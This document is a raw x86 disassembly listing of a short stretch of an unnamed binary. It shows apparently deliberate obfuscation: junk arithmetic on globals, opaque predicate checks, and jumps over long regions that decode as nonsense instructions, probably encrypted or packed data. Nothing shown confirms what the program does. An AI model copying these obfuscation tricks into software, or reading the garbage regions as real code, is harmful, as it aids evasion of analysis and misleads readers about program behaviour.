  40968c:	xor    DWORD PTR ds:0x4284cd,esi
  409692:	and    DWORD PTR ds:0x4284d5,ecx
  409698:	dec    esi
  409699:	cmp    DWORD PTR ds:0x4284d9,0x0
  4096a0:	mov    DWORD PTR ds:0x4284e1,0x1a91
  4096aa:	movzx  esi,BYTE PTR ds:0x428331
  4096b1:	mov    esi,0x63fe
  4096b6:	jmp    0x409715
  4096bb:	mov    DWORD PTR ds:0x42841d,0x20e7
  4096c5:	cmp    DWORD PTR ds:0x4284d9,0x0
  4096cc:	jae    0x4096f5
  4096d2:	push   DWORD PTR [ebp-0x20]
  4096d5:	push   0x278f
  4096da:	push   DWORD PTR [ebp-0x1c]
  4096dd:	call   DWORD PTR ds:0x42e004
  4096e3:	or     esi,DWORD PTR ds:0x4284c1
  4096e9:	sbb    esi,DWORD PTR ds:0x4284b5
  4096ef:	and    DWORD PTR ds:0x42831d,edx
  4096f5:	dec    DWORD PTR ds:0x428559
  4096fb:	or     esi,0x67c0
  409701:	add    DWORD PTR ds:0x428405,0x146d
  40970b:	sbb    DWORD PTR ds:0x428555,0xdcf
  409715:	mov    esi,DWORD PTR [ebp-0x1c]
  409718:	add    eax,0x355c
  40971d:	mov    DWORD PTR ds:0x42835d,0x28d
  409727:	adc    ecx,0x819
  40972d:	xor    DWORD PTR ds:0x428321,0x49ee
  409737:	or     eax,edx
  409739:	mov    DWORD PTR ds:0x428355,0x383a
  409743:	mov    edx,DWORD PTR [ebp-0x10]
  409746:	or     ecx,esi
  409748:	sub    DWORD PTR ds:0x428349,0x6778
  409752:	mov    esi,DWORD PTR [ebp-0xc]
  409755:	or     eax,edx
  409757:	movzx  edx,BYTE PTR ds:0x42853d
  40975e:	xor    edx,DWORD PTR ds:0x428455
  409764:	mov    DWORD PTR ds:0x42853d,edx
  40976a:	mov    edx,DWORD PTR [ebp-0x30]
  40976d:	or     ecx,esi
  40976f:	mov    esi,DWORD PTR [ebp-0x2c]
  409772:	or     eax,0xf34
  409777:	neg    DWORD PTR ds:0x428459
  40977d:	or     ecx,0x6c90
  409783:	mov    DWORD PTR ds:0x42844d,0x7584
  40978d:	cmp    edx,eax
  40978f:	mov    DWORD PTR ds:0x428431,0x7ecb
  409799:	jne    0x4097bb
  40979f:	mov    DWORD PTR ds:0x4283fd,0x4655
  4097a9:	cmp    esi,ecx
  4097ab:	mov    DWORD PTR ds:0x4283fd,0x7ff3
  4097b5:	je     0x40a10f
  4097bb:	xor    esi,esi
  4097bd:	or     esi,DWORD PTR ds:0x42854d
  4097c3:	adc    DWORD PTR ds:0x4284d5,esi
  4097c9:	mov    DWORD PTR [ebp-0x30],0x5ddc
  4097d0:	mov    DWORD PTR [ebp-0x2c],0x7433
  4097d7:	mov    eax,DWORD PTR [ebp-0x30]
  4097da:	mov    ecx,DWORD PTR [ebp-0x2c]
  4097dd:	xor    ecx,0xfffffd1f
  4097e3:	xor    eax,0xffff9fff
  4097e8:	and    ecx,0x6e0
  4097ee:	and    eax,0x6244
  4097f3:	mov    DWORD PTR [ebp-0x10],eax
  4097f6:	mov    DWORD PTR [ebp-0xc],ecx
  4097f9:	mov    DWORD PTR [ebp-0x20],0x4a50
  409800:	mov    DWORD PTR [ebp-0x1c],0x2079
  409807:	mov    DWORD PTR [ebp-0x28],0x792e
  40980e:	mov    DWORD PTR [ebp-0x24],0x10e8
  409815:	mov    DWORD PTR [ebp-0x30],0x22b3
  40981c:	mov    DWORD PTR [ebp-0x2c],0x2293
  409823:	mov    eax,DWORD PTR [ebp-0x30]
  409826:	mov    ecx,DWORD PTR [ebp-0x2c]
  409829:	mov    edx,DWORD PTR [ebp-0x28]
  40982c:	mov    esi,DWORD PTR [ebp-0x24]
  40982f:	add    eax,edx
  409831:	mov    edx,DWORD PTR [ebp-0x20]
  409834:	adc    ecx,esi
  409836:	mov    esi,DWORD PTR [ebp-0x1c]
  409839:	add    eax,0x3e60
  40983e:	adc    ecx,0xd49e
  409844:	xor    eax,0x14ce
  409849:	xor    ecx,0x354f
  40984f:	add    eax,edx
  409851:	mov    edx,DWORD PTR [ebp-0x10]
  409854:	adc    ecx,esi
  409856:	mov    esi,DWORD PTR [ebp-0xc]
  409859:	cmp    edx,eax
  40985b:	jne    0x409869
  409861:	cmp    esi,ecx
  409863:	je     0x40a10f
  409869:	mov    DWORD PTR [ebp-0x28],0x4db
  409870:	mov    DWORD PTR [ebp-0x24],0x233b
  409877:	mov    DWORD PTR [ebp-0x30],0x2c94
  40987e:	push   0x6b33
  409883:	mov    DWORD PTR [ebp-0x2c],0x647f
  40988a:	jmp    0x409b09
  40988f:	and    BYTE PTR [ebx-0x53bd1443],ah
  409895:	sub    al,0xab
  409897:	dec    edi
  409898:	test   al,0xc
  40989a:	xchg   edx,eax
  40989b:	jl     0x4098f5
  40989d:	xchg   BYTE PTR [edx+esi*8+0x79bebe87],ah
  4098a4:	ret    0xbebe
  4098a7:	pusha  
  4098a8:	push   cs
  4098a9:	out    0x91,eax
  4098ab:	and    DWORD PTR [ebx],edi
  4098ad:	pop    esi
  4098ae:	ins    BYTE PTR es:[edi],dx
  4098af:	jae    0x409907
  4098b1:	jno    0x409845
  4098b3:	ficom  WORD PTR [ebp-0x293b465b]
  4098b9:	push   ebp
  4098ba:	pop    esi
  4098bb:	shl    BYTE PTR [esi],0xd7
  4098be:	nop
  4098bf:	fld    st(1)
  4098c1:	pushf  
  4098c2:	mov    ds:0x6bf3e952,eax
  4098c7:	sbb    al,0x6e
  4098c9:	les    edi,FWORD PTR ds:0x336413d9
  4098cf:	xchg   ecx,eax
  4098d0:	ffree  st(0)
  4098d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098d3:	test   BYTE PTR [edx],dl
  4098d5:	mov    BYTE PTR [esi-0x55847a53],bh
  4098db:	jmp    0x73a2:0xfbb31801
  4098e2:	push   edi
  4098e3:	hlt    
  4098e4:	out    dx,eax
  4098e5:	fwait
  4098e6:	retf   0x5a41
  4098e9:	hlt    
  4098ea:	fnsave [edi-0x43]
  4098ed:	pop    ds
  4098ee:	retf   
  4098ef:	aaa    
  4098f0:	scas   eax,DWORD PTR es:[edi]
  4098f1:	xchg   edi,eax
  4098f2:	cmp    BYTE PTR [edi],dl
  4098f4:	ja     0x4098cc
  4098f6:	stos   DWORD PTR es:[edi],eax
  4098f7:	das    
  4098f8:	xchg   esp,eax
  4098f9:	cld    
  4098fa:	loope  0x409880
  4098fc:	in     al,0x6f
  4098fe:	push   ecx
  4098ff:	stos   BYTE PTR es:[edi],al
  409900:	lahf   
  409901:	push   ebx
  409902:	inc    edx
  409903:	push   0xfffffff7
  409905:	sahf   
  409906:	sbb    DWORD PTR ds:[ecx-0x51737117],esp
  40990d:	mov    edi,0x5fa5bf85
  409912:	and    eax,eax
  409914:	jmp    DWORD PTR [ecx+edi*2]
  409917:	inc    eax
  409918:	sbb    DWORD PTR [edx+0x25229836],ebp
  40991e:	pop    es
  40991f:	mov    ch,0xbc
  409921:	lds    ecx,FWORD PTR [eax]
  409923:	call   0x3008:0xcf1589b8
  40992a:	popa   
  40992b:	fst    DWORD PTR [edx]
  40992d:	repz jg 0x409974
  409930:	sbb    bh,dh
  409932:	dec    BYTE PTR [edx-0x310f97b6]
  409938:	addr16 mov ds:0xa41b,eax
  40993c:	ret    0x152d
  40993f:	sbb    eax,0xeab83b95
  409944:	mov    esp,ecx
  409946:	inc    edx
  409947:	mov    fs,WORD PTR [eax-0x4d]
  40994a:	sub    DWORD PTR [edx+edx*2+0x634e4be2],eax
  409951:	cmp    edi,DWORD PTR [esi-0x54203d73]
  409957:	movntps XMMWORD PTR [esi-0x14365de0],xmm6
  40995e:	inc    edi
  40995f:	pop    ebx
  409960:	dec    eax
  409961:	fsincos 
  409963:	int3   
  409964:	mov    bh,0x47
  409966:	rcr    DWORD PTR [edx],0x4c
  409969:	es mov bh,ah
  40996c:	out    dx,eax
  40996d:	adc    esp,DWORD PTR [eax-0xda44343]
  409973:	mov    eax,ds:0xe2e2294c
  409978:	add    cl,BYTE PTR [ecx+ebx*4]
  40997b:	dec    esp
  40997c:	clc    
  40997d:	dec    eax
  40997e:	fnstsw WORD PTR [ecx+ecx*4]
  409981:	fcomp  DWORD PTR [esi+0x774e50cc]
  409987:	jnp    0x409997
  409989:	outs   dx,DWORD PTR ds:[esi]
  40998a:	in     al,dx
  40998b:	adc    eax,0xbee71298
  409990:	jmp    0x4099ed
  409992:	fild   QWORD PTR [edi]
  409994:	fbld   TBYTE PTR [esi+0x4bfb7679]
  40999a:	sbb    bl,BYTE PTR [ecx-0x30943205]
  4099a0:	das    
  4099a1:	ins    DWORD PTR es:[edi],dx
  4099a2:	stc    
  4099a3:	xlat   BYTE PTR ds:[ebx]
  4099a4:	pop    edi
  4099a5:	add    BYTE PTR ds:0x3fdc5951,dh
  4099ab:	(bad)
  4099ae:	push   edx
  4099af:	mov    edx,0xc46f29d0
  4099b4:	js     0x4099c8
  4099b6:	xlat   BYTE PTR ds:[ebx]
  4099b7:	mov    eax,ds:0xac648707
  4099bc:	loopne 0x4099b8
  4099be:	sub    bl,ch
  4099c0:	sbb    bl,0x14
  4099c3:	ins    DWORD PTR es:[edi],dx
  4099c4:	mov    ah,BYTE PTR [ecx-0x3a3ee084]
  4099ca:	stos   BYTE PTR es:[edi],al
  4099cb:	xor    al,dl
  4099cd:	fild   WORD PTR [ebp-0xf]
  4099d0:	jne    0x409a2f
  4099d2:	mov    ah,BYTE PTR [edx+0x3dfa8c7f]
  4099d8:	jmp    0x60d0dbd9
  4099dd:	lods   al,BYTE PTR ds:[esi]
  4099de:	ror    DWORD PTR [eax+0x38e1f097],1
  4099e4:	mov    esp,0x74ebe469
  4099e9:	or     ebx,DWORD PTR [esi+0x74e4d569]
  4099ef:	and    al,0xfd
  4099f1:	jecxz  0x4099e3
  4099f3:	mov    eax,ds:0x36be7c97
  4099f8:	jp     0x4099fb
  4099fa:	mov    ah,0xaf
  4099fc:	or     BYTE PTR [eax],ah
  4099fe:	in     eax,0x67
  409a00:	mov    bl,0xbb
  409a02:	add    eax,0xcc31f8bd
  409a07:	pop    eax
  409a08:	dec    edi
  409a09:	call   FWORD PTR ds:0x3ae39d86
  409a0f:	test   eax,0xe95da2ce
  409a14:	pusha  
  409a15:	repz pop esp
  409a17:	and    bh,al
  409a19:	mov    eax,ds:0x718b2d93
  409a1e:	xor    al,0x19
  409a20:	aad    0x5b
  409a22:	jmp    0xad509c2f
  409a27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a28:	jne    0x4099fc
  409a2a:	adc    DWORD PTR [eax+ebx*1-0x56],ecx
  409a2e:	lock sbb esp,DWORD PTR [ebx-0x73]
  409a32:	ret    0x90b3
  409a35:	repnz fcmovu st,st(3)
  409a38:	mov    WORD PTR [ebx],ds
  409a3a:	std    
  409a3b:	jmp    0x409ab8
  409a3d:	xchg   BYTE PTR [ecx],ch
  409a3f:	cmp    edx,DWORD PTR [edx]
  409a41:	pop    ds
  409a42:	hlt    
  409a43:	lds    edi,FWORD PTR [esi+0x27]
  409a46:	sub    al,0x74
  409a48:	daa    
  409a49:	mov    BYTE PTR [eax-0x5],ch
  409a4c:	jg     0x409a19
  409a4e:	pop    edx
  409a4f:	pop    es
  409a50:	(bad)  
  409a51:	cwde   
  409a52:	lock fadd DWORD PTR [ebp+eiz*1+0x2aef7f75]
  409a5a:	jo     0x4099e7
  409a5c:	and    eax,0x61278d4f
  409a61:	sub    al,0x9b
  409a63:	fwait
  409a64:	dec    edi
  409a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a66:	imul   ecx,DWORD PTR [ebx-0x52f695fd],0xffffff9f
  409a6d:	(bad)  
  409a6e:	xchg   esp,eax
  409a6f:	pop    ecx
  409a70:	jmp    0xea27:0xc008bebd
  409a77:	mov    edx,0x7aaf271c
  409a7c:	pop    eax
  409a7d:	fldz   
  409a7f:	lods   eax,DWORD PTR ds:[esi]
  409a80:	out    dx,eax
  409a81:	sar    DWORD PTR [ebx-0x80],cl
  409a84:	pop    esp
  409a85:	pop    ecx
  409a86:	mov    DWORD PTR [esi],eax
  409a88:	rol    BYTE PTR ds:0x1aa56500,0xf
  409a8f:	fiadd  WORD PTR [esi]
  409a91:	stc    
  409a92:	mov    ds:0x2a3cfc0e,al
  409a97:	mov    al,ds:0x3d39f82f
  409a9c:	sbb    ebx,DWORD PTR [edi+ebp*2]
  409a9f:	add    BYTE PTR [edx+0x59949376],0x47
  409aa6:	sar    eax,cl
  409aa8:	or     eax,0xa96a5b45
  409aad:	mov    edx,0xb6a94dd5
  409ab2:	rol    BYTE PTR [esi-0x2],cl
  409ab5:	mov    cl,0xbf
  409ab7:	inc    ecx
  409ab8:	or     BYTE PTR [esi+0x7e0a0fda],0x94
  409abf:	imul   edi,eax,0xbea439cb
  409ac5:	out    dx,eax
  409ac6:	and    al,0xaa
  409ac8:	add    ebp,DWORD PTR [edx+0x30]
  409acb:	mov    dl,0xbd
  409acd:	cmp    DWORD PTR [eax+0x8],edi
  409ad0:	ds aad 0x31
  409ad3:	fwait
  409ad4:	lahf   
  409ad5:	xchg   DWORD PTR [edi+0x340eefaa],edx
  409adb:	sub    al,0xcd
  409add:	cmp    BYTE PTR [ebx-0x63],ch
  409ae0:	(bad)  
  409ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ae2:	lods   eax,DWORD PTR ds:[esi]
  409ae3:	add    al,0x8d
  409ae5:	out    dx,al
  409ae6:	adc    DWORD PTR [ecx-0x3d0790b],esp
  409aec:	push   eax
  409aed:	fs aam 0xdb
  409af0:	cs and eax,edx
  409af3:	call   0x7590:0x8c6602a8
  409afa:	shl    dl,0xde
  409afd:	(bad)  
  409afe:	adc    eax,DWORD PTR [ebx]
  409b00:	push   esp
  409b01:	fadd   QWORD PTR [ebx-0x7f]
  409b04:	and    ecx,DWORD PTR [eax+0x43]
  409b07:	iret   
  409b08:	mov    esi,0x8bd0458b
  409b0d:	dec    ebp
  409b0e:	aam    0x68
  409b10:	(bad)  
  409b11:	jl     0x409b13
  409b13:	add    BYTE PTR [ecx+0x50],dl
  409b16:	call   0x41594e
  409b1b:	mov    ecx,DWORD PTR [ebp-0x28]
  409b1e:	mov    esi,DWORD PTR [ebp-0x24]
  409b21:	push   0x4e1a18a
  409b26:	push   0x283cdcc
  409b2b:	and    edx,esi
  409b2d:	and    eax,ecx
  409b2f:	push   edx
  409b30:	push   eax
  409b31:	call   0x41594e
  409b36:	xor    eax,0x687b
  409b3b:	xor    edx,0x18d4
  409b41:	mov    DWORD PTR [ebp-0x30],eax
  409b44:	mov    DWORD PTR [ebp-0x2c],edx
  409b47:	mov    eax,ds:0x42290c
  409b4c:	cmp    eax,0x7cd80819
  409b51:	jne    0x40a10f
  409b57:	mov    eax,DWORD PTR [ebp-0x18]
  409b5a:	mov    ecx,DWORD PTR [ebp-0x14]
  409b5d:	mov    edx,DWORD PTR [ebp-0x18]
  409b60:	mov    esi,DWORD PTR [ebp-0x14]
  409b63:	shrd   eax,ecx,0x2
  409b67:	shl    edx,0x1e
  409b6a:	mov    edx,DWORD PTR ds:0x4226f8
  409b70:	mov    edx,DWORD PTR [edx+0x1a8]
  409b76:	shr    ecx,0x2
  409b79:	xor    esi,esi
  409b7b:	mov    ecx,0x32de6d5d
  409b80:	xor    eax,ecx
  409b82:	or     eax,esi
  409b84:	mov    DWORD PTR [edx],eax
  409b86:	mov    eax,DWORD PTR [ebp-0x18]
  409b89:	mov    edx,DWORD PTR [ebp-0x14]
  409b8c:	shrd   eax,edx,0x2
  409b90:	shr    edx,0x2
  409b93:	mov    edx,DWORD PTR [ebp-0x18]
  409b96:	mov    esi,DWORD PTR [ebp-0x14]
  409b99:	xor    eax,ecx
  409b9b:	xor    esi,esi
  409b9d:	or     eax,esi
  409b9f:	mov    ds:0x42290c,eax
  409ba4:	mov    BYTE PTR [ebp-0x2],0x4f
  409ba8:	mov    BYTE PTR [ebp-0x1],0xf9
  409bac:	movzx  eax,BYTE PTR [ebp-0x1]
  409bb0:	shl    edx,0x1e
  409bb3:	mov    dl,BYTE PTR [ebp-0x2]
  409bb6:	xor    al,0x42
  409bb8:	add    al,dl
  409bba:	jmp    0x409e39
  409bbf:	mov    ah,0x7e
  409bc1:	mov    ch,0xd4
  409bc3:	mov    ebx,0x3e9ebcfc
  409bc8:	mov    cl,0x9a
  409bca:	jecxz  0x409bf2
  409bcc:	dec    esp
  409bcd:	mov    ah,BYTE PTR [esi+ebp*4+0x79bebe8b]
  409bd4:	ret    0xbebe
  409bd7:	mov    bh,0xbf
  409bd9:	clc    
  409bda:	xchg   ecx,eax
  409bdb:	sti    
  409bdc:	in     al,0xf5
  409bde:	cli    
  409bdf:	in     eax,dx
  409be0:	pop    ds
  409be1:	xor    al,cl
  409be3:	out    0x29,al
  409be5:	pop    esi
  409be6:	pop    eax
  409be7:	xchg   edi,eax
  409be8:	popa   
  409be9:	cwde   
  409bea:	inc    eax
  409beb:	sbb    DWORD PTR [ecx],eax
  409bed:	jnp    0x409bf9
  409bef:	pop    esi
  409bf0:	cli    
  409bf1:	or     cl,BYTE PTR [edi+eiz*1+0x15]
  409bf5:	mov    dh,0xa5
  409bf7:	mov    al,ds:0x9e75755b
  409bfc:	cld    
  409bfd:	outs   dx,BYTE PTR ds:[esi]
  409bfe:	mov    al,ds:0x2de40db8
  409c03:	adc    BYTE PTR [edx+eiz*1],al
  409c06:	fld    QWORD PTR [eax]
  409c08:	mov    DWORD PTR [eax-0x981bc14],esp
  409c0e:	into   
  409c0f:	sbb    BYTE PTR [ecx],bl
  409c11:	clc    
  409c12:	hlt    
  409c13:	in     al,dx
  409c14:	add    BYTE PTR [ebx],bh
  409c16:	aaa    
  409c17:	xchg   ebp,eax
  409c18:	xor    BYTE PTR [ebx+eax*1+0x2cc43643],0xc7
  409c20:	test   DWORD PTR [edx-0x74da52e9],0xa71a4b1f
  409c2a:	add    eax,0xa402110a
  409c2f:	bts    DWORD PTR [eax],ecx
  409c32:	and    BYTE PTR [ebx],bh
  409c34:	jne    0x409c5e
  409c36:	outs   dx,DWORD PTR ds:[esi]
  409c37:	and    eax,edx
  409c39:	es push edx
  409c3b:	repz fist DWORD PTR [ebx+0x5ce74f39]
  409c42:	cmp    BYTE PTR [edi-0x3a29809],ah
  409c48:	out    dx,eax
  409c49:	sbb    DWORD PTR [edi+0x1b],esp
  409c4c:	mov    eax,0x41cb3c7b
  409c51:	out    0xc5,eax
  409c53:	mov    edi,0x433d4756
  409c58:	push   ecx
  409c59:	jo     0x409c40
  409c5b:	scas   eax,DWORD PTR es:[edi]
  409c5c:	inc    eax
  409c5d:	std    
  409c5e:	retf   0x542e
  409c61:	sbb    eax,0xf152c855
  409c67:	push   DWORD PTR [esi+esi*8+0x2fa120fa]
  409c6e:	mov    esp,0x3fa03292
  409c73:	outs   dx,BYTE PTR ds:[esi]
  409c74:	jmp    0x6b00:0x7685ca62
  409c7b:	nop
  409c7c:	jae    0x409c13
  409c7e:	jge    0x409cc8
  409c80:	out    dx,eax
  409c81:	das    
  409c82:	shr    DWORD PTR [eax],cl
  409c84:	pop    ebx
  409c85:	xor    DWORD PTR [esp+ebx*1],ebp
  409c88:	test   eax,0xa07ce07b
  409c8d:	jmp    0x409c4c
  409c8f:	sbb    BYTE PTR [esi-0xd2381f5],0x2c
  409c96:	into   
  409c97:	fadd   QWORD PTR [edx]
  409c99:	call   0x8cd0:0xc6e4964c
  409ca0:	inc    ebp
  409ca1:	scas   eax,DWORD PTR es:[edi]
  409ca2:	or     DWORD PTR [eax+0x13],eax
  409ca5:	mov    al,0x83
  409ca7:	inc    edx
  409ca8:	or     DWORD PTR [ebx+0x69],0x5
  409cac:	sub    edx,DWORD PTR [esi]
  409cae:	out    dx,al
  409caf:	adc    BYTE PTR [ebx+0x444e0ef5],ah
  409cb5:	or     ch,al
  409cb7:	xchg   ebx,eax
  409cb8:	jb     0x409c67
  409cba:	shl    bh,cl
  409cbc:	mov    ebp,?
  409cbe:	(bad)  
  409cbf:	(bad)  
  409cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cc1:	call   0x4b3f02b1
  409cc6:	xor    eax,DWORD PTR [edi-0x6d0a4786]
  409ccc:	in     al,dx
  409ccd:	push   esp
  409cce:	xchg   ecx,eax
  409ccf:	push   edi
  409cd0:	sub    BYTE PTR [eax+0x1405f17a],al
  409cd6:	xchg   ecx,eax
  409cd7:	push   cs
  409cd8:	mov    bh,0x58
  409cda:	jae    0x409cf8
  409cdc:	outs   dx,DWORD PTR ds:[esi]
  409cdd:	push   0x439305e3
  409ce2:	inc    esi
  409ce3:	scas   al,BYTE PTR es:[edi]
  409ce4:	retf   0xdb1b
  409ce7:	cmc    
  409ce8:	jb     0x409c82
  409cea:	(bad)  ds:0x8e1b1ed0
  409cf0:	(bad)  
  409cf1:	icebp  
  409cf2:	xor    eax,0xfdf8381e
  409cf7:	neg    DWORD PTR [edi+eax*8+0x6d]
  409cfb:	das    
  409cfc:	pop    ecx
  409cfd:	bound  esi,QWORD PTR [esi+0x6a]
  409d00:	in     eax,0xff
  409d02:	mov    bh,0x7e
  409d04:	push   edx
  409d05:	out    0xcf,al
  409d07:	sub    dh,BYTE PTR [ecx+0x256476cb]
  409d0d:	(bad)
  409d11:	fstp   QWORD PTR [edx+0x3faa0a30]
  409d17:	jmp    0x3021121
  409d1c:	pusha  
  409d1d:	inc    eax
  409d1e:	popa   
  409d1f:	into   
  409d20:	retf   
  409d21:	push   edx
  409d22:	inc    ebp
  409d23:	mov    ds:0x8c0218e5,al
  409d28:	mov    BYTE PTR [edi+edi*1-0x47e7b240],bh
  409d2f:	push   edi
  409d30:	and    ch,dh
  409d32:	and    edx,ebx
  409d34:	stos   DWORD PTR es:[edi],eax
  409d35:	cmp    DWORD PTR [ebp+0x4939e44a],ebx
  409d3b:	or     ebx,DWORD PTR [ebp+0x73ef4108]
  409d41:	sbb    al,dl
  409d43:	mov    eax,ds:0xbe84aa89
  409d48:	dec    edi
  409d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d4a:	mov    esp,0x15263d39
  409d4f:	mov    ebx,0xf60548f5
  409d54:	mov    esp,0x380ed8a
  409d59:	cwde   
  409d5a:	jge    0x409db7
  409d5c:	push   edi
  409d5d:	out    0x4e,eax
  409d5f:	pushf  
  409d60:	repnz pop esi
  409d62:	pop    eax
  409d63:	push   ss
  409d64:	inc    edi
  409d65:	stos   DWORD PTR es:[edi],eax
  409d66:	xchg   esp,eax
  409d67:	xor    BYTE PTR [esi],0x28
  409d6a:	pop    esp
  409d6b:	mov    ch,0xd3
  409d6d:	fild   DWORD PTR [edi]
  409d6f:	pop    ecx
  409d70:	stos   DWORD PTR es:[edi],eax
  409d71:	or     dh,dh
  409d73:	mov    cl,0x4e
  409d75:	(bad)  
  409d77:	fimul  WORD PTR [ebx]
  409d79:	lock mov ah,0x33
  409d7c:	mov    eax,ds:0x5eed66b3
  409d81:	sbb    DWORD PTR [ebx-0x3],ecx
  409d84:	or     edi,DWORD PTR [esp+ebp*4+0x5e]
  409d88:	mov    cl,0x31
  409d8a:	mov    al,ds:0xb3426dbb
  409d8f:	push   ebp
  409d90:	pop    ecx
  409d91:	and    dh,ch
  409d93:	xor    BYTE PTR [esi-0x1387e35e],bl
  409d99:	inc    ecx
  409d9a:	cld    
  409d9b:	xchg   ecx,eax
  409d9c:	push   edi
  409d9d:	stc    
  409d9e:	inc    edi
  409d9f:	and    al,0x77
  409da1:	int    0x7
  409da3:	aas    
  409da4:	mov    eax,ds:0xc3bf9505
  409da9:	mov    al,ds:0x40d2924c
  409dae:	mov    edi,0xba90a414
  409db3:	sahf   
  409db4:	inc    edx
  409db5:	add    ebx,ecx
  409db7:	push   ebx
  409db8:	push   edi
  409db9:	pop    edi
  409dba:	push   ebp
  409dbb:	test   eax,0x5f4b4302
  409dc0:	and    BYTE PTR [ebp+0x741c2e5c],0xb7
  409dc7:	pop    ebp
  409dc8:	xchg   esi,eax
  409dc9:	mov    ?,WORD PTR [ebp-0x5]
  409dcc:	icebp  
  409dcd:	scas   al,BYTE PTR es:[edi]
  409dce:	add    al,0xa0
  409dd0:	pop    esi
  409dd1:	int3   
  409dd2:	mov    ecx,0xa0b12e6b
  409dd7:	xor    al,0xd6
  409dd9:	sbb    BYTE PTR [edx+ebx*4-0x12],dh
  409ddd:	stc    
  409dde:	nop
  409ddf:	std    
  409de0:	stc    
  409de1:	enter  0xb600,0x9e
  409de5:	and    BYTE PTR [eax*8+0x665b906],0x3b
  409ded:	adc    al,0x17
  409def:	and    al,0x62
  409df1:	stc    
  409df2:	adc    al,0xfa
  409df4:	dec    ebx
  409df5:	popf   
  409df6:	jmp    0xe3ca:0xff0f263f
  409dfd:	in     eax,0x4f
  409dff:	(bad)  
  409e00:	and    eax,0x643bd31b
  409e05:	add    al,0xee
  409e07:	xor    dh,BYTE PTR [ecx+0x12]
  409e0a:	xchg   ecx,eax
  409e0b:	popa   
  409e0c:	xor    al,BYTE PTR [eax-0x6e5dc32a]
  409e12:	mov    ds:0xdad726b,al
  409e17:	adc    BYTE PTR [ecx-0x63],bh
  409e1a:	ja     0x409dc4
  409e1c:	in     al,dx
  409e1d:	mov    ?,WORD PTR [esi-0x5]
  409e20:	and    eax,esi
  409e22:	push   esi
  409e23:	out    0xa5,al
  409e25:	push   ss
  409e26:	jb     0x409e9e
  409e28:	pop    esi
  409e29:	(bad)  
  409e2a:	nop
  409e2b:	adc    ecx,DWORD PTR [esi+0x5e]
  409e2e:	popa   
  409e2f:	neg    DWORD PTR [ebp-0x4f]
  409e32:	ins    BYTE PTR es:[edi],dx
  409e33:	mov    dh,0x48
  409e35:	sbb    BYTE PTR [edx+0x71],cl
  409e38:	outs   dx,DWORD PTR ds:[esi]
  409e39:	push   0x6
  409e3b:	add    eax,0xfa
  409e40:	mov    BYTE PTR [ebp-0x4],al
  409e43:	mov    BYTE PTR [ebp-0x3],0x67
  409e47:	pop    eax
  409e48:	mov    BYTE PTR [ebp-0x1],al
  409e4b:	mov    BYTE PTR [ebp-0x2],0x3
  409e4f:	mov    dl,BYTE PTR [ebp-0x2]
  409e52:	movzx  esi,dl
  409e55:	cdq    
  409e56:	idiv   esi
  409e58:	mov    dl,BYTE PTR [ebp-0x1]
  409e5b:	add    al,dl
  409e5d:	mov    dl,BYTE PTR [ebp-0x3]
  409e60:	or     al,dl
  409e62:	mov    dl,BYTE PTR [ebp-0x4]
  409e65:	add    al,0x3a
  409e67:	cmp    dl,al
  409e69:	jae    0x40a10f
  409e6f:	mov    eax,DWORD PTR [ebp-0x18]
  409e72:	jmp    0x40a0f1
  409e77:	popa   
  409e78:	nop
  409e79:	popf   
  409e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7b:	mov    ah,0xb8
  409e7d:	imul   ebx,DWORD PTR [eax+edi*1+0x3da4862c],0x4
  409e85:	xchg   esp,eax
  409e86:	nop
  409e87:	imul   edx,DWORD PTR [ecx-0x3d864142],0xe218bebe
  409e91:	push   cs
  409e92:	ret    0x68a5
  409e95:	inc    edi
  409e96:	je     0x409edb
  409e98:	pop    esp
  409e99:	adc    DWORD PTR [ecx+0x11],edi
  409e9c:	mov    eax,0x34485af3
  409ea1:	mov    esp,0x2fe5c627
  409ea6:	sahf   
  409ea7:	jle    0x409eb4
  409ea9:	stc    
  409eaa:	mov    cl,0xb5
  409eac:	ins    DWORD PTR es:[edi],dx
  409ead:	mov    eax,0x19f56271
  409eb2:	adc    dl,BYTE PTR [edi]
  409eb4:	pop    eax
  409eb5:	inc    ebx
  409eb6:	mov    ch,0x95
  409eb8:	push   0xffffffcd
  409eba:	cmp    BYTE PTR [ecx+0x5f054c09],al
  409ec0:	out    dx,eax
  409ec1:	sub    esi,ebp
  409ec3:	jge    0x409e82
  409ec5:	add    esp,DWORD PTR [edi+0x45667653]
  409ecb:	adc    eax,0xbfaabeb5
  409ed0:	popa   
  409ed1:	dec    eax
  409ed2:	test   al,0x4e
  409ed4:	xchg   ebp,eax
  409ed5:	cmc    
  409ed6:	es mov bl,0xc0
  409ed9:	jne    0x409ec4
  409edb:	mov    ds:0x26e88934,al
  409ee0:	xor    DWORD PTR [edx],esi
  409ee2:	sub    bh,bh
  409ee4:	sub    al,0x8b
  409ee6:	or     al,0xce
  409ee8:	mul    BYTE PTR [ebx+0x52]
  409eeb:	sub    esi,DWORD PTR [ebx+ebx*2+0x23]
  409eef:	or     esi,DWORD PTR [ebx-0x75]
  409ef2:	aaa    
  409ef3:	mul    BYTE PTR ds:0xcb5756bb
  409ef9:	sub    bl,BYTE PTR [edx]
  409efb:	fstp   DWORD PTR [ecx-0x1a591bf2]
  409f01:	retf   
  409f02:	pop    ss
  409f03:	pop    esp
  409f04:	outs   dx,DWORD PTR ds:[esi]
  409f05:	(bad)  
  409f06:	push   0xffffffe0
  409f08:	test   DWORD PTR [eax-0x62ec81be],esp
  409f0e:	in     eax,dx
  409f0f:	(bad)  
  409f10:	loop   0x409f39
  409f12:	ror    BYTE PTR [ebx+0x47],1
  409f15:	jge    0x409f6c
  409f17:	pushf  
  409f18:	imul   ecx,DWORD PTR [ebx+0x2],0x522b19b9
  409f1f:	adc    eax,0x521ac990
  409f24:	int    0x8b
  409f26:	cs push eax
  409f28:	adc    ebp,eax
  409f2a:	mov    es,WORD PTR [ebx+0x406dee3c]
  409f30:	xor    esp,DWORD PTR [eax+0x38b34349]
  409f36:	sub    ch,dl
  409f38:	dec    eax
  409f39:	out    dx,al
  409f3a:	cmp    eax,0x88c60009
  409f3f:	fnstcw WORD PTR [ecx+0x7fdc7da9]
  409f45:	test   al,0x13
